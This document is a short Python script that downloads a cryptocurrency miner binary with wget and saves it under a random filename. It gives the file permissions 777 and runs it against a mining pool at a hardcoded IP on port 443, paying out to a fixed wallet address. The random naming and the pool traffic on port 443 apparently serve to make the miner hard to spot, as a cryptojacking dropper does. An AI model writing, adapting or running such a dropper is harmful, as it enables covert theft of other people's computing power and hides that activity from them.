import os
import subprocess
import platform
import random
import string
from datetime import datetime
from zoneinfo import ZoneInfo  # Python 3.9+

# Generate a fully random filename (10 characters, no prefix)
def generate_random_filename():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

# Define the URL for the miner binary
url = "https://github.com/xpherechain/Xphere-miner/releases/download/v0.0.6/miner-linux-amd64"

# Download the miner to a file with a random name
def download_miner(miner_filename):
    print("📥 Downloading miner...")
    try:
        subprocess.run(['wget', url, '-O', miner_filename], check=True)
        print(f"✅ Download complete. Saved as: {miner_filename}")
    except subprocess.CalledProcessError:
        print("❌ Error downloading miner. Exiting.")
        exit(1)

# Set executable permissions
def set_permissions(miner_filename):
    print(f"🔐 Setting permissions for {miner_filename}...")
    try:
        os.chmod(miner_filename, 0o777)
        print("✅ Permissions set.")
    except Exception as e:
        print(f"❌ Error setting permissions: {e}")
        exit(1)

# Use fixed worker name "POKALA"
def generate_worker_name():
    return "POKALA"

# Run the miner using all CPU cores
def run_miner(miner_filename, worker_name):
    stratum_url = f"stratum+tcp://0x1932E17CB48175Fd79FD08596eCd246071913Cb4.{worker_name}:x@50.116.30.155:443"
    
    print(f"🚀 Starting miner with worker name: {worker_name}")
    try:
        subprocess.run([f"./{miner_filename}", "-stratum", stratum_url], check=True)
    except subprocess.CalledProcessError as e:
        print(f"❌ Error running the miner: {e}")
        exit(1)

# Main logic
def main():
    if platform.system() != 'Linux':
        print("❌ This script is only supported on Linux.")
        exit(1)

    miner_filename = generate_random_filename()
    download_miner(miner_filename)
    set_permissions(miner_filename)
    worker_name = generate_worker_name()
    run_miner(miner_filename, worker_name)

if __name__ == "__main__":
    main()
